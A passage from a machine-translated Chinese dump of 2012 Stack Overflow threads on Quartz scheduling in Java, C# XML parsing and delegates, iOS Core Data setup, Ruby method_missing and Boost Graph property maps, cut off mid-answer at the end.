使用 JobStore 的计划作业，因此每天在计划的时间执行作业。但问题是当一个作业正在执行时，我不能在其他地方使用调度程序实例。即，在其他操作中，我试图通过使用来获取实例

```
scheduler = schedulerFactory.getScheduler("ASYNC_JOBS_SCHEDULER"); 
```

但是我将调度程序设为空，后来 scheduler.getJobGroupNames() 是空指针异常。但是一旦工作结束，调度程序就会返回，并提供所有详细信息。

我很困惑，是我错过了一些设置还是 Quartz 有错误。请为此提供解决方案。

实例化和启动调度程序的类（servlet）。我没有使用quartz.properties 文件，因为按照说明，我不应该多次指定db 凭据，即在hibernate.cfg.xml 中，然后在quartz.properties 中。

```
package com.generalsentiment.test.quartz;

import static org.quartz.CronScheduleBuilder.cronSchedule;
import static org.quartz.JobBuilder.newJob;
import static org.quartz.TriggerBuilder.newTrigger;

import java.lang.reflect.Field;
import java.sql.Driver;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Date;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;
import com.google.common.collect.Maps;
import org.apache.commons.configuration.Configuration;
import org.apache.commons.configuration.PropertiesConfiguration;
import org.apache.commons.configuration.ConfigurationException;

import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;

import org.hibernate.SessionFactory;
import org.hibernate.impl.SessionFactoryImpl;
import org.quartz.CronTrigger;
import org.quartz.JobDetail;
import org.quartz.JobKey;
import org.quartz.Scheduler;
import org.quartz.SchedulerException;
import org.quartz.SchedulerMetaData;
import org.quartz.impl.matchers.GroupMatcher;

import com.generalsentiment.util.HibernateUtil;
import com.generalsentiment.util.quartz.SchedulerConstants;
import com.generalsentiment.util.quartz.QuartzSchedulerUtil;
import org.apache.commons.configuration.*;

public class QuartzServlet implements ServletContextListener {

    private Map<String, String> existingJobsList;
    private String hibernateConnectionUrl;
    private SessionFactory sessionFactory;

    @Override
    public void contextInitialized(ServletContextEvent sce) {
        try {
            Properties properties = new Properties();
            Field f = SessionFactoryImpl.class.getDeclaredField("properties");
            f.setAccessible(true);
            sessionFactory = HibernateUtil.getSessionFactory();

            Properties p = (Properties) f.get(sessionFactory);
            properties.setProperty("org.quartz.scheduler.instanceName", SchedulerConstants.SCHEDULER_INSTANCE_NAME);
            properties.setProperty("org.quartz.threadPool.class", "org.quartz.simpl.SimpleThreadPool");
            properties.setProperty("org.quartz.threadPool.threadCount", "4");
            properties.setProperty("org.quartz.threadPool.threadsInheritContextClassLoaderOfInitializingThread", "true");

            properties.setProperty("org.quartz.jobStore.class", "org.quartz.impl.jdbcjobstore.JobStoreCMT");
            properties.setProperty("org.quartz.jobStore.driverDelegateClass", "org.quartz.impl.jdbcjobstore.StdJDBCDelegate");
            properties.setProperty("org.quartz.jobStore.useProperties", "false");
            properties.setProperty("org.quartz.jobStore.dataSource", "tasksDataStoreContainer");
            properties.setProperty("org.quartz.jobStore.nonManagedTXDataSource", "tasksDataStoreQuartz");
            properties.setProperty("org.quartz.jobStore.tablePrefix", "QRTZ_");
            properties.setProperty("org.quartz.jobStore.misfireThreshold", "60000");
            properties.setProperty("org.quartz.jobStore.isClustered", "false");

            properties.setProperty("org.quartz.dataSource.tasksDataStoreContainer.driver", p.getProperty("hibernate.connection.driver_class"));
            properties.setProperty("org.quartz.dataSource.tasksDataStoreContainer.URL", p.getProperty("hibernate.connection.url"));
            properties.setProperty("org.quartz.dataSource.tasksDataStoreContainer.user", p.getProperty("hibernate.connection.username"));
            properties.setProperty("org.quartz.dataSource.tasksDataStoreContainer.password", p.getProperty("hibernate.connection.password"));
            properties.setProperty("org.quartz.dataSource.tasksDataStoreContainer.maxConnections", "20");

            properties.setProperty("org.quartz.dataSource.tasksDataStoreQuartz.driver", p.getProperty("hibernate.connection.driver_class"));
            properties.setProperty("org.quartz.dataSource.tasksDataStoreQuartz.URL", p.getProperty("hibernate.connection.url"));
            properties.setProperty("org.quartz.dataSource.tasksDataStoreQuartz.user", p.getProperty("hibernate.connection.username"));
            properties.setProperty("org.quartz.dataSource.tasksDataStoreQuartz.password", p.getProperty("hibernate.connection.password"));
            properties.setProperty("org.quartz.dataSource.tasksDataStoreQuartz.maxConnections", "20");
            hibernateConnectionUrl = p.getProperty("hibernate.connection.url");

            System.out.println("THE APPLICATION STARTED");

            // First we must get a reference to a scheduler
            existingJobsList = Maps.newHashMap();
            Scheduler scheduler = QuartzSchedulerUtil.initiateSchedulerFactory(properties);
            System.out.println("------- Initialization Complete --------");
            System.out.println("------- Scheduling Jobs ----------------");

            System.out.println("------- Starting Scheduler ----------------");
            List<String> jobGroupNames = scheduler.getJobGroupNames();
            for (String current : jobGroupNames) {
                for (JobKey jobKey : scheduler.getJobKeys(GroupMatcher.<JobKey>groupEquals(current))) {
                    existingJobsList.put(jobKey.getName(), jobKey.getGroup());
                }
            }

            if (!existingJobsList.containsKey("ExportOrgUsersToFileJob")) {

                JobDetail job = newJob(ExportOrgUsersToFileJob.class).withIdentity("ExportOrgUsersToFileJob",
                        SchedulerConstants.JOBS_GROUP).build();

                CronTrigger trigger = newTrigger().withIdentity("trigger@morning",
                        SchedulerConstants.TRIGGER_MORNING_GROUP).withSchedule(cronSchedule("00 10 15 * * ?")).build();
                job.getJobDataMap().put("jobDescription", "Exports a particular Organization users to file");
                job.getJobDataMap().put("jobStatus", SchedulerConstants.JOB_STATUS.PENDING);
                Date ft = scheduler.scheduleJob(job, trigger);
            }

            if (!existingJobsList.containsKey("DownloadScoresJob")) {
                JobDetail job1 = newJob(DownloadScoresJob.class).withIdentity("DownloadScoresJob",
                        SchedulerConstants.JOBS_GROUP).build();

                CronTrigger trigger1 = newTrigger().withIdentity("trigger@evening",
                        SchedulerConstants.TRIGGER_EVENING_GROUP).withSchedule(cronSchedule("00 15 15 * * ?")).build();

                job1.getJobDataMap().put("jobDescription", "Downloads involvement index scores for given synsets");
                job1.getJobDataMap().put("jobStatus", SchedulerConstants.JOB_STATUS.PENDING);
                Date ft1 = scheduler.scheduleJob(job1, trigger1);
            }
            //            JobListener jobListener = new QuartzJobListener();
            //            scheduler.getListenerManager().addJobListener(jobListener, allJobs());

            scheduler.start();

            System.out.println("------- Started Scheduler -----------------");

            SchedulerMetaData metaData = scheduler.getMetaData();
            System.out.println("Executed " + metaData.getNumberOfJobsExecuted() + " jobs.");
        } catch (IllegalAccessException ex) {
            Logger.getLogger(QuartzServlet.class.getName()).log(Level.SEVERE, null, ex);
        } catch (NoSuchFieldException ex) {
            Logger.getLogger(QuartzServlet.class.getName()).log(Level.SEVERE, null, ex);
        } catch (SecurityException ex) {
            Logger.getLogger(QuartzServlet.class.getName()).log(Level.SEVERE, null, ex);
        } catch (SchedulerException se) {
            System.out.println(se);
        } catch (ConfigurationException ex) {
            Logger.getLogger(QuartzServlet.class.getName()).log(Level.SEVERE, null, ex);
        }

    }

    @Override
    public void contextDestroyed(ServletContextEvent sce) {
        try {
            Scheduler scheduler = QuartzSchedulerUtil.getCurrentScheduler();
            if (scheduler != null) {
                //to avoid NPE
                scheduler.shutdown(true);
            }
            Thread.sleep(1000);
            Driver mySqlDriver = DriverManager.getDriver(hibernateConnectionUrl);
            DriverManager.deregisterDriver(mySqlDriver);
            sessionFactory.close();
        } catch (SchedulerException ex) {
            Logger.getLogger(QuartzServlet.class.getName()).log(Level.SEVERE, null, ex);
        } catch (InterruptedException ex) {
            Logger.getLogger(QuartzServlet.class.getName()).log(Level.SEVERE, null, ex);
        } catch (SQLException ex) {
            Logger.getLogger(QuartzServlet.class.getName()).log(Level.SEVERE, null, ex);
        }
        System.out.println("THE QUARTZ APPLICATION STOPPED");
    }

    public String getHibernateConnectionUrl() {
        return hibernateConnectionUrl;
    }

    public void setHibernateConnectionUrl(String hibernateConnectionUrl) {
        this.hibernateConnectionUrl = hibernateConnectionUrl;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T22:41:07.077

我正在使用 Quartz v1.8.4 和 Struts2（并不是说我认为这在这里特别重要）。要在我的一项操作中访问调度程序，我必须使用以下内容。

```
 public Scheduler getScheduler() throws SchedulerException {
    ServletContext context = this.getServletRequest().getSession().getServletContext();
    SchedulerFactory factory = (StdSchedulerFactory) context.getAttribute("org.quartz.impl.StdSchedulerFactory.KEY");
    return factory.getScheduler();
} 
```

我项目中的石英罐是quartz-1.8.4.jar 和quartz-oracle-1.8.4.jar。

我使用他们提供的 servlet 初始化 Quartz，我只是在 web.xml 中定义：

```
<servlet> 
  <servlet-name>QuartzInitializer</servlet-name> 
  <servlet-class>org.quartz.ee.servlet.QuartzInitializerServlet</servlet-class> 
  <init-param>
    <param-name>shutdown-on-unload</param-name>
    <param-value>true</param-value>
  </init-param>
  <load-on-startup>2</load-on-startup>
</servlet> 
```

# c# - 可以有一个完全相同的子类的 XML 类

> ID：11583702
> 
> 赞同：0
> 
> 时间：2012-07-20T16:49:00.793
> 
> 标签：c#, xml, xml-parsing, linq-to-xml, xmlreader

我需要解析这个 xml 文档（仅部分）：

```
<channel>
 <item>
   <title>a</title>
   <description>aa</description>
   <link url= "www.a.com" />
 </item>
<item>
   <title>b</title>
   <description>bb</description>
   <link url= "www.b.com" />
 </item>
<item>
   <title>c</title>
   <description>cc</description>
   <link url= "www.c.com" />
 </item>
<item>
   <title>d</title>
   <description>dd</description>
    <channelContents>
      <item>
         <title>a</title>
         <description>aa</description>
         <link url= "www.a.com" />
      </item>
      <item>
         <title>b</title>
         <description>bb</description>
         <link url= "www.b.com" />
      </item>
      <item>
         <title>c</title>
         <description>cc</description>
         <link url= "www.c.com" />
      </item>
    </channelContents>
 </item>
</channel> 
```

这是我的代码：

```
List<ItemList> itemList = null;
reader = XmlReader.Create(new StringReader(content));
loadedData = XDocument.Load(reader);
var query = from i in loadedData.Descendants("item")
    select new ItemList
    {
        Title = (string)i.Element("title"),
        Description = (string)i.Element("description"),
        Link = (string)i.Element("link").Attribute("url").Value
    };
itemList = query.ToList(); 
```

每当我解析链接时都会出错。我想我找到了原因，这是因为 tag `<channelContents>`。标题为“d”的项目具有在描述之后出现的标签，其中违反了`<item>`. 是否可以只解析项目，`<channelContents>`因为它具有相同的项目（a，b 和 c）？

我收到一个错误：

> NullReferenceException 因为 itemList 为空。

我尝试删除`Link = (string)i.Element("link").Attribute("url").Value`，它确实有效。但我需要得到链接。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:00:17.780

您的问题是第四项没有直接链接节点。

```
 var query = from i in loadedData.Descendants("item")
                        select new 
                        {
                            Title = (string)i.Element("title"),
                            Description = (string)i.Element("description"),
                            Link = (string)i.Descendants("link").FirstOrDefault().Attribute("url").Value
                        }; 
```

可能会做你想做的事.. 返回 7 个节点.. a,b,c,d 和另一个 a,b,c

# c# - 如何注册稍后调用的函数？

> ID：11583705
> 
> 赞同：1
> 
> 时间：2012-07-20T16:49:10.907
> 
> 标签：c#, interface, delegates, task-parallel-library, function-prototypes

我运行一个控制台应用程序并声明并实例化了一个类型为 的对象`Foo`。除了`Main()`方法之外，我还想指定一个附加方法（让我们调用它`ProcessMessages()`）并让它执行一些工作。的主要工作`Foo`是接受发送到 tcp 套接字并进行处理的消息。作为该过程的一部分，我需要指定`func<T>`传递此类消息的函数。`ProcessMessages()`（在 Foo 之外）应该是这样的功能。如何使用 foo 注册此函数，而无需传递对其包含类的引用？

Foo 包含一个 TPL 数据流块，它需要`func<T>`对块中的排队项进行操作。但是该函数不包含在 Foo 中，而是包含在实例化 Foo 类型对象的类中。即使我必须编写更复杂的代码，我也在寻找稍后调用此方法的最快方法。最终，我想隐藏 Foo 中的底层 tpl 数据流块，并且只想调用 Foo 中的一个函数，该函数设置一个 tpl 数据流块并向它注册一个位于 Foo 之外的方法，以后可以将项目传递给该方法. 完成这项工作的最佳方法是什么？注册部分是让我困惑的部分。

编辑：这里有一些代码可能更好地描述了我试图实现的目标：

a) 在 Main() 我有以下从不同类中调用的方法：

```
public void OnControlMessage(object sender, EventArgs args)
    {
        Console.WriteLine("Comp1 received Control Message");
    } 
```

我通过以下方式注册此方法：

```
List<ZeroMqMessaging.CallBackMethod> registeredMethods = new List<ZeroMqMessaging.CallBackMethod>(){ 
            new ZeroMqMessaging.CallBackMethod(MessageType.ControlMessage, OnControlMessage) }; 
```

b) 调用回调的 ActionBlock 如下所示：

```
ActionBlock<Tuple<int, byte[]>> newActionBlock = new ActionBlock<Tuple<int, byte[]>>(x => callback.eventHandler(this, new MyEventArg(callback.messageType, x.Item2))); 
```

OnControlMessage 被正确调用，但是，我需要将特定消息作为 EventArgs 的一部分传递给 OnControlMessage。我创建了一个派生自 EventArg 的类 MyEventArg，但我仍然无法在 OnControlMessage 中访问 MyEventArg 的成员。

最好我喜欢 OnControlMessage(ControlMessage message){...} 以便不必强制转换。如何注册此 OnControlMessage 以便可以使用我选择的参数回调此方法？我可能有许多不同的此类回调方法，因此要求在创建 CallBackMethod 对象时，像我目前在 a) 中所做的那样，坚持使用 1 行简短的方法进行注册。我希望这更清楚一些。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:56:16.507

您可能需要创建一个委托：

```
public delegate void MyMessageHandler(string message); 
```

然后你可以像这样使用它：

```
public void Work(MyMessageHandler callback)
{
    string message = "";
    ....
    callback(message);
} 
```

然后你这样称呼它：

```
public Main()
{
    Work(ProcessMessages);
}
public void ProcessMessages(string message)
{
    ....
} 
```

# ios - Core Data 应用程序在启动时崩溃

> ID：11583708
> 
> 赞同：1
> 
> 时间：2012-07-20T16:49:25.487
> 
> 标签：ios, core-data

我一直在尝试将 Core Data 合并到以标准视图控制器开头的情节提要应用程序中，但我正在遵循的教程使用标签栏作为初始视图。

有没有办法使用初始视图控制器启动应用程序，然后在应用程序委托中应用标签栏？本教程使用应用程序委托来实现核心数据，并使用标签栏控制器作为初始视图。

这是应用程序delegate.h

```
#import <UIKit/UIKit.h>
#import <CoreData/CoreData.h>

@interface AppDelegate : UIResponder <UIApplicationDelegate>

@property (strong, nonatomic) UIWindow *window;

@property (readonly, strong, nonatomic) NSManagedObjectContext *managedObjectContext;
@property (readonly, strong, nonatomic) NSManagedObjectModel *managedObjectModel;
@property (readonly, strong, nonatomic) NSPersistentStoreCoordinator *persistentStoreCoordinator;
@property (strong, nonatomic) NSFetchedResultsController *fetchedResultsController;

- (void)saveContext;
- (NSURL *)applicationDocumentsDirectory;

@end 
```

这是应用程序 delegate.m 文件

```
#import "AppDelegate.h"

#import "PersonsTVC.h"
#import "RolesTVC.h"

@implementation AppDelegate

@synthesize window = _window;
@synthesize managedObjectContext = __managedObjectContext;
@synthesize managedObjectModel = __managedObjectModel;
@synthesize persistentStoreCoordinator = __persistentStoreCoordinator;
@synthesize fetchedResultsController = __fetchedResultsController;

- (void)insertRoleWithRoleName:(NSString *)roleName
{
Role *role = [NSEntityDescription insertNewObjectForEntityForName:@"Role"
                                               inManagedObjectContext:self.managedObjectContext];

role.name = roleName;

[self.managedObjectContext save:nil];
}

- (void)importCoreDataDefaultRoles {

NSLog(@"Importing Core Data Default Values for Roles...");
[self insertRoleWithRoleName:@"C/C++ Developer"];
[self insertRoleWithRoleName:@"Obj-C Developer"];
[self insertRoleWithRoleName:@"Java Developer"];
[self insertRoleWithRoleName:@"ASP.NET Developer"];
[self insertRoleWithRoleName:@"Unix Engineer"];
[self insertRoleWithRoleName:@"Windows Engineer"];
[self insertRoleWithRoleName:@"Business Analyst"];
[self insertRoleWithRoleName:@"Infrastructure Manager"];
[self insertRoleWithRoleName:@"Project Manager"];
[self insertRoleWithRoleName:@"Operations Manager"];
[self insertRoleWithRoleName:@"Desktop Support Analyst"];
[self insertRoleWithRoleName:@"Chief Information Officer"];
NSLog(@"Importing Core Data Default Values for Roles Completed!");
}
- (void)setupFetchedResultsController
{
// 1 - Decide what Entity you want
NSString *entityName = @"Role"; // Put your entity name here
NSLog(@"Setting up a Fetched Results Controller for the Entity named %@", entityName);

// 2 - Request that Entity
NSFetchRequest *request = [NSFetchRequest fetchRequestWithEntityName:entityName];

// 3 - Filter it if you want
//request.predicate = [NSPredicate predicateWithFormat:@"Person.name = Blah"];

// 4 - Sort it if you want
request.sortDescriptors = [NSArray arrayWithObject:[NSSortDescriptor sortDescriptorWithKey:@"name"
                                                                                 ascending:YES
                                                                                  selector:@selector(localizedCaseInsensitiveCompare:)]];
// 5 - Fetch it
self.fetchedResultsController = [[NSFetchedResultsController alloc] initWithFetchRequest:request
                                                                    managedObjectContext:self.managedObjectContext
                                                                      sectionNameKeyPath:nil
                                                                               cacheName:nil];
[self.fetchedResultsController performFetch:nil];
}
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
[self setupFetchedResultsController];

if (![[self.fetchedResultsController fetchedObjects] count] > 0 ) {
    NSLog(@"!!!!! ~~> There's nothing in the database so defaults will be inserted");
    [self importCoreDataDefaultRoles];
}
else {
    NSLog(@"There's stuff in the database so skipping the import of default data");    
}

// The Tab Bar
UITabBarController *tabBarController = (UITabBarController *)self.window.rootViewController;

// The Two Navigation Controllers attached to the Tab Bar (At Tab Bar Indexes 0 and 1)
UINavigationController *personsTVCnav = [[tabBarController viewControllers] objectAtIndex:0];
UINavigationController *rolesTVCnav = [[tabBarController viewControllers] objectAtIndex:1];

// The Persons Table View Controller (First Nav Controller Index 0)
PersonsTVC *personsTVC = [[personsTVCnav viewControllers] objectAtIndex:0];
personsTVC.managedObjectContext = self.managedObjectContext;    

// The Roles Table View Controller (Second Nav Controller Index 0)
RolesTVC *rolesTVC = [[rolesTVCnav viewControllers] objectAtIndex:0];
rolesTVC.managedObjectContext = self.managedObjectContext;

//NOTE: Be very careful to change these indexes if you change the tab order

// Override point for customization after application launch.
// UINavigationController *navigationController = (UINavigationController *)self.window.rootViewController;
// RolesTVC *controller = (RolesTVC *)navigationController.topViewController;
// controller.managedObjectContext = self.managedObjectContext;
return YES;
}

- (void)applicationWillResignActive:(UIApplication *)application
{
/*
 Sent when the application is about to move from active to inactive state. This can occur     for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
 Use this method to pause ongoing tasks, disable timers, and throttle down OpenGL ES frame rates. Games should use this method to pause the game.
 */
}

- (void)applicationDidEnterBackground:(UIApplication *)application
{
/*
 Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later. 
 If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
 */
}

- (void)applicationWillEnterForeground:(UIApplication *)application
{
/*
 Called as part of the transition from the background to the inactive state; here you can   undo many of the changes made on entering the background.
 */
}

- (void)applicationDidBecomeActive:(UIApplication *)application
{
/*
 Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
 */
}

- (void)applicationWillTerminate:(UIApplication *)application
{
// Saves changes in the application's managed object context before the application terminates.
[self saveContext];
}

- (void)saveContext
{
NSError *error = nil;
NSManagedObjectContext *managedObjectContext = self.managedObjectContext;
if (managedObjectContext != nil)
{
    if ([managedObjectContext hasChanges] && ![managedObjectContext save:&error])
    {
        /*
         Replace this implementation with code to handle the error appropriately.

         abort() causes the application to generate a crash log and terminate. You should not use this function in a shipping application, although it may be useful during development. 
         */
        NSLog(@"Unresolved error %@, %@", error, [error userInfo]);
        abort();
    } 
}
}

#pragma mark - Core Data stack

/**
Returns the managed object context for the application.
If the context doesn't already exist, it is created and bound to the persistent store
coordinator for the application.
*/
- (NSManagedObjectContext *)managedObjectContext
{
if (__managedObjectContext != nil)
{
    return __managedObjectContext;
}

NSPersistentStoreCoordinator *coordinator = [self persistentStoreCoordinator];
if (coordinator != nil)
{
    __managedObjectContext = [[NSManagedObjectContext alloc] init];
    [__managedObjectContext setPersistentStoreCoordinator:coordinator];
}
return __managedObjectContext;
}

/**
Returns the managed object model for the application.
If the model doesn't already exist, it is created from the application's model.
*/
- (NSManagedObjectModel *)managedObjectModel
{
if (__managedObjectModel != nil)
{
    return __managedObjectModel;
}
NSURL *modelURL = [[NSBundle mainBundle] URLForResource:@"Model" withExtension:@"momd"];
__managedObjectModel = [[NSManagedObjectModel alloc] initWithContentsOfURL:modelURL];
return __managedObjectModel;
}

- (NSPersistentStoreCoordinator *)persistentStoreCoordinator
{
if (__persistentStoreCoordinator != nil)
{
    return __persistentStoreCoordinator;
}

NSURL *storeURL = [[self applicationDocumentsDirectory] URLByAppendingPathComponent:@"StaffManager.sqlite"];

NSError *error = nil;
__persistentStoreCoordinator = [[NSPersistentStoreCoordinator alloc] initWithManagedObjectModel:[self managedObjectModel]];

NSDictionary *options = [NSDictionary dictionaryWithObjectsAndKeys:
                         [NSNumber numberWithBool:YES], NSMigratePersistentStoresAutomaticallyOption,
                         [NSNumber numberWithBool:YES], NSInferMappingModelAutomaticallyOption, nil];
if (![__persistentStoreCoordinator addPersistentStoreWithType:NSSQLiteStoreType configuration:nil URL:storeURL options:options error:&error])
{
    /*
     Replace this implementation with code to handle the error appropriately.

     abort() causes the application to generate a crash log and terminate. You should not use this function in a shipping application, although it may be useful during development. 

     Typical reasons for an error here include:
     * The persistent store is not accessible;
     * The schema for the persistent store is incompatible with current managed object model.
     Check the error message to determine what the actual problem was.

     If the persistent store is not accessible, there is typically something wrong with the file path. Often, a file URL is pointing into the application's resources directory instead of a writeable directory.

     If you encounter schema incompatibility errors during development, you can reduce their frequency by:
     * Simply deleting the existing store:
     [[NSFileManager defaultManager] removeItemAtURL:storeURL error:nil]

     * Performing automatic lightweight migration by passing the following dictionary as the options parameter: 
     [NSDictionary dictionaryWithObjectsAndKeys:[NSNumber numberWithBool:YES], NSMigratePersistentStoresAutomaticallyOption, [NSNumber numberWithBool:YES], NSInferMappingModelAutomaticallyOption, nil];

     Lightweight migration will only work for a limited set of schema changes; consult "Core Data Model Versioning and Data Migration Programming Guide" for details.

     */
    NSLog(@"Unresolved error %@, %@", error, [error userInfo]);
    abort();
}    

return __persistentStoreCoordinator;
}

#pragma mark - Application's Documents directory

- (NSURL *)applicationDocumentsDirectory
{
return [[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject];
}

@end 
```

如您所见，我正在尝试将核心数据添加到我的故事板应用程序中。在应用程序委托的这种情况下，我将标签栏控制器添加为根视图控制器，然后将控制器添加到标签栏。

我喜欢在应用程序委托的标签栏之前添加一个开始视图，然后添加标签栏及其各自的控制器。

我试图将标签栏添加为子视图，但托管对象没有被调用并且应用程序崩溃。

如果更有经验的程序员可以提供一些帮助，我真的很感激。如果需要，我可以通过电子邮件发送项目或上传代码。我需要指导人员，并且非常感谢我得到的任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-14T13:59:11.327

好吧，我终于想通了。我向该栏添加了一个子视图作为选项卡栏的子项，并将其设置为第一个视图并且它可以工作。

# ruby-on-rails - 如何在 RubyOnRails 中实现魔术函数？

> ID：11583710
> 
> 赞同：0
> 
> 时间：2012-07-20T16:49:29.373
> 
> 标签：ruby-on-rails, ruby

如果访问属性并且其属性没有数据，我有一个模型可以从 REST API 动态加载数据：

```
class Issue
  attr_accessor :ticket_title, :priority, :description
  @ticket_title
  @priority
  @description

  def priority
    if !@priority.empty?
      updateProperties()
    end
    @priority
  end
  def description
    if !@description.empty?
      updateProperties()
    end
    @description
  end
  def ticket_title
    if !@ticket_title.empty?
      updateProperties()
    end
    @ticket_title
  end

  def updateProperties
    # loads all data from REST API
  end

  def initialize (hsh = {})
      hsh.each { |key, value|
        self.instance_variable_set("@#{key}", value) 
      }
  end

end 
```

有两个问题：

1.  如果我用 初始化模型`RedmineIssue.new :ticket_title => 'test'`，我不想调用模型`updateProperties`，但不知何故它确实如此。
2.  有没有办法神奇地声明函数？即，如果没有真正的功能尝试运行元功能？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T17:00:33.580

要动态添加方法，您应该阅读`method_missing`.
很好的文章解释了它的一些方面。
[http://www.trottercashion.com/2011/02/08/rubys-define_method-method_missing-and-instance_eval.html](http://www.trottercashion.com/2011/02/08/rubys-define_method-method_missing-and-instance_eval.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T17:06:12.480

好吧，这里有一些关于“魔法”的东西。在您的课程中，如果您希望能够通过名为`get_whateverthekeyis`（愚蠢的示例，我知道）的方法获取散列的任何部分，您可以使用`method_missing`：

```
class Foo
  def initialize
    @h = {}
  end
  def method_missing(name, *args, &block)
    if(name =~ /\Aget_(.+)\Z/)
      #Name is valid
      sig_class.class_exec($1) do |n|
        define_method("get_"+n) {@h[n]}
      end

      @h[$1]
    elsif(name =~ /\Aset_(.+)\Z/)
      #Name is valid
      sig_class.class_exec($1) do |n|
        define_method("set_"+n) {|v| @h[n]=v}
      end

      @h[$1] = args[0]
    else
      super
    end
  end
  private
  def sig_class
    class << self
      self
    end
  end
end 
```

当方法未定义时，它转到`method_missing`. 发生这种情况时，`method_missing`对哈希进行请求的操作，然后动态*定义*方法，以便下次直接调用方法，这意味着效率更高，因为方法已经存在。这有点类似于`method_missing`Ruby 自己的 OpenStruct 使用的 。

# c++ - Boost的property_map测试一个key是否存在？

> ID：11583711
> 
> 赞同：1
> 
> 时间：2012-07-20T16:49:30.353
> 
> 标签：c++, boost, boost-graph, boost-property-map

在 BGL 的上下文中，我需要迭代`in_edges`and`out_edges`但我想排除那些属于反向边缘的部分，即排除那些属于反向边缘的部分`property_map`。下面的代码显示了我想做的事情，但当然`property_map`没有`find`和`end`方法。

更新：一种可能的解决方案是在构建图形时维护一个单独的结构，例如包含反向边的地图。如果我可以控制图形构建，这将起作用，但我没有，因为我使用该函数`read_dimacs_max_flow`读取 DIMACS 格式的图形文件。所以我只能依靠 BGL 的可访问性方法来弄清楚什么是什么。

图定义：

```
typedef adjacency_list_traits<vecS, vecS, bidirectionalS> ttraits;  
typedef adjacency_list<vecS, vecS, bidirectionalS,
        // vertex properties
        property<vertex_index_t, int,
        property<vertex_color_t, default_color_type> >,
        // edge properties
        property<edge_capacity_t, int,
        property<edge_residual_capacity_t, int,
        property<edge_reverse_t, ttraits::edge_descriptor> > >, no_property, vecS> tbgl_adjlist_bidir;

typedef graph_traits<tbgl_adjlist_bidir>::vertex_descriptor     tvertex;
typedef graph_traits<tbgl_adjlist_bidir>::edge_descriptor       tedge;
typedef property_map<tbgl_adjlist_bidir, edge_capacity_t>::type tedge_capacity_map;
typedef property_map<tbgl_adjlist_bidir, edge_reverse_t>::type  treverse_edge_map;
typedef property_map<tbgl_adjlist_bidir, vertex_color_t>::type  tvertex_color_map;
typedef property_map<tbgl_adjlist_bidir, vertex_index_t>::type  tvertex_index_map;
typedef graph_traits<tbgl_adjlist_bidir>::vertex_iterator       tvertex_iterator;
typedef graph_traits<tbgl_adjlist_bidir>::edge_iterator         tedge_iterator;
typedef graph_traits<tbgl_adjlist_bidir>::out_edge_iterator     tout_edge_iterator;
typedef graph_traits<tbgl_adjlist_bidir>::in_edge_iterator      tin_edge_iterator; 
```

以及我想做的示例片段（但没有编译并出现以下错误）：

```
tvertex_index_map indices = get(vertex_index, bgl_adjlist_bidir);
tedge_capacity_map capacities = get(edge_capacity, bgl_adjlist_bidir);
treverse_edge_map rev_edges = get(edge_reverse, bgl_adjlist_bidir);

// iterate all vertices in the right order
for (int current = 0; current < m_num_vertices; ++current) {
    printf("processing vertex=%d\n", current);
    tin_edge_iterator ei1, ei1_end;
    for (tie(ei1, ei1_end) = in_edges(tvertex(current), bgl_adjlist_bidir); ei1 != ei1_end; ++ei1) {
        // exclude reverse edges <<<<<<<======= HOW DO I DO THIS??
        if (rev_edges.find(*ei1) != rev_edges.end()) {
            continue;
        }
        int in = indices[boost::source(*ei1, bgl_adjlist_bidir)];
        printf("in edge: %d <- %d \n", current, in);
    }
} 
```

和编译器错误：

```
/Users/bravegag/code/fastcode_project/build_debug$ make 2> out ; grep -i "error" ./out
[  2%] Building CXX object CMakeFiles/submodularity.dir/src/graph/hp_adjlist_bidir.cc.o
/Users/bravegag/code/fastcode_project/code/src/api/hp_adjlist_bidir.h:146:18: error: 'treverse_edge_map' has no member named 'find'
/Users/bravegag/code/fastcode_project/code/src/api/hp_adjlist_bidir.h:146:42: error: 'treverse_edge_map' has no member named 'end'
make[2]: *** [CMakeFiles/submodularity.dir/src/graph/hp_adjlist_bidir.cc.o] Error 1
make[1]: *** [CMakeFiles/submodularity.dir/all] Error 2
make: *** [all] Error 2 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:57:39.100

您的`edge_reverse`属性映射会将边缘描述符关联到图形的每个边缘。因此，“查找”函数没有任何意义，因为所有边都将在该属性映射中具有相应的条目（请记住，此类属性映射不一定作为`std::map`对象实现，事实上，它们并非如此内部属性）。

您可以而且应该做的一件事是为每条边设置反向边属性的值，使其要么是反向边的边描述符，要么是无效的边描述符（对于非反向边）。然后，检查（而不是“查找”）只是检查反向边缘属性是否是有效的边缘描述符之一。

不幸的是，BGL 不提供`null_edge()`静态函数（就像它提供的那样`null_vertex()`）。这可能是开发人员的遗漏（我开发了一些自己的图形结构，并且包含了一个`null_edge()`函数，但在 Boost 中没有）。这意味着很难想出一个好的和可移植的“空边”描述符值来使用。一种选择是使用特定的位模式，如下所示：

```
ttraits::edge_descriptor my_null_edge;
memset((char*)&my_null_edge, 0xFF, sizeof(ttraits::edge_descriptor)); 
```

然后，确保将所有非反向边缘的反向边缘属性设置为`my_null_edge`，然后使用此比较实现您的循环：

```
for (tie(ei1, ei1_end) = in_edges(tvertex(current), bgl_adjlist_bidir); ei1 != ei1_end; ++ei1) {
    // exclude reverse edges
    if (rev_edges[*ei1] != my_null_edge) {
        continue;
    }
    int in = indices[boost::source(*ei1, bgl_adjlist_bidir)];
